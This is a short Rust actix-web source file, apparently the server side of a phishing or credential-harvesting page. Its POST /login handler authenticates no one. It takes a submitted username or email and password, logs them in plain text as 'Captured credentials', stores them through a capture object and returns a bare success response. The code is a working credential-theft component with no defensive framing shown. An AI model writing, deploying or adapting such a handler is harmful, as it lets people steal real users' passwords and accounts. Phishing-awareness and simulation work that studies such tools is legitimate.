use crate::capture::Capture;
use actix_web::{post, web, HttpResponse};
use log::info;
use serde::Deserialize;

#[derive(Debug, Deserialize)]
pub struct Credentials {
    pub username: Option<String>,
    pub email: Option<String>,
    pub password: String,
}

#[post("/login")]
pub async fn login(form: web::Form<Credentials>, capture: web::Data<Capture>) -> HttpResponse {
    info!(
        "Captured credentials: {} | {}",
        form.username
            .as_deref()
            .or(form.email.as_deref())
            .unwrap_or("?"),
        form.password
    );

    capture.save(&form).await;

    HttpResponse::Ok().finish()
}
